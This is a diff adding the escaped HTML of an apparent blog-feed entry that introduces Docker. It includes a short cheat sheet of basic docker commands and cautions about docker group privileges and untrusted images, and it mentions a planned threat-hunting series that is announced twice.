+&lt;ol&gt;
+  &lt;li&gt;Create a image/pull one from a repository&lt;/li&gt;
+  &lt;li&gt;Build and run the container :)&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Some interesting facts:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Each container runs in a separated process in the host.&lt;/li&gt;
+  &lt;li&gt;Beware, by default it does not restrict the amount of RAM and CPU from the containers.&lt;/li&gt;
+  &lt;li&gt;To run the docker command you will need sudo privileges, or to be in the &lt;code class=&quot;highlighter-rouge&quot;&gt;docker&lt;/code&gt; group. In other words, the &lt;code class=&quot;highlighter-rouge&quot;&gt;docker &lt;/code&gt; group has &lt;strong&gt;sudo&lt;/strong&gt; privileges.&lt;/li&gt;
+  &lt;li&gt;As far as I know the recipes (Dockerfile) used to built the images in docker hub are not known, &lt;strong&gt;USE WITH CAUTION&lt;/strong&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;I’m planning to publish a full series on how to do pratical threat hunting using the elk stack, sysmon, wazuh and stuff in a small lab, let’s see how it goes.&lt;/p&gt;
+
+&lt;h2 id=&quot;cheat-sheet&quot;&gt;Cheat sheet&lt;/h2&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;docker pull
+
+&lt;span class=&quot;c&quot;&gt;# Check running containers&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;docker ps &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# Check images&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;docker images &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# Interact with container&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;docker &lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-it&lt;/span&gt; &amp;lt;CONTAINER_ID&amp;gt; bash
+
+&lt;span class=&quot;c&quot;&gt;# Binding port 80 from container to 8008 in host &lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;docker run nginx &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 80:8008 &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; /home/id3/html:/usr/share/html 
+
+&lt;span class=&quot;c&quot;&gt;# Mapping a local volume into the container&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;docker run nginx &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; /home/id3/config:/etc/nginx
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;I’m planning to publish a full series on how to do pratical threat hunting using the elk stack, sysmon, wazuh and stuff in a small lab, let’s see how it goes.&lt;/p&gt;</content><author><name></name></author><summary type="html">Leveraging DevOps to Threat Hunt</summary></entry></feed>
